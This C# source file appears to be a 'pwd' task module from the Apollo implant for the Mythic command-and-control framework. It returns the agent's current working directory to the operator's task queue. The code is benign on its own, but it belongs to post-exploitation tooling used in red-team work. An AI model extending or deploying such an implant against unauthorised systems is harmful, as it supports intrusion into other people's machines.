#define COMMAND_NAME_UPPER

#if DEBUG
#define PWD
#endif

#if PWD

using System;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;

namespace Tasks
{
    public class pwd : Tasking
    {
        public pwd(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {

        }

        public override void Kill()
        {
            throw new NotImplementedException();
        }

        public override void Start()
        {
            MythicTaskResponse resp = CreateTaskResponse(
                $"{System.IO.Directory.GetCurrentDirectory().ToString()}",
                true,
                "completed");
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}
#endif
